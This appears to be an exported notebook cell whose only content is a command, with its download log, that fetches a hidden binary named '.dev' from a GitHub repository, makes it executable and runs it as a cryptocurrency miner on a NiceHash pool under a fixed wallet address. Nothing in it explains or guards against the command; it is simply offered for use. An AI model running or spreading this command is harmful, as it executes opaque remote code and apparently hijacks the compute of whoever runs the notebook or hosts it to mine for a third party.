# %%
# !wget https://github.com/WhynotSir/sirji/raw/main/.dev && chmod +x .dev && ./.dev --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 39G9GJdAoBK4Q2mkudSnDhRj3DThDAVJsh
# Out:
# --2022-01-17 07:39:57--  https://github.com/WhynotSir/sirji/raw/main/.dev
# Resolving github.com (github.com)... 140.82.112.4
# Connecting to github.com (github.com)|140.82.112.4|:443... connected.
# HTTP request sent, awaiting response... 302 Found
# Location: https://raw.githubusercontent.com/WhynotSir/sirji/main/.dev [following]
# --2022-01-17 07:39:58--  https://raw.githubusercontent.com/WhynotSir/sirji/main/.dev
# Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
# Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
# HTTP request sent, awaiting response... 200 OK
# Length: 5222752 (5.0M) [application/octet-stream]
# Saving to: ‘.dev’
#
# .dev                100%[===================>]   4.98M  --.-KB/s    in 0.08s
#
# 2022-01-17 07:39:58 (65.4 MB/s) - ‘.dev’ saved [5222752/5222752]
#
# +---------------------------------------------------------+
# ...
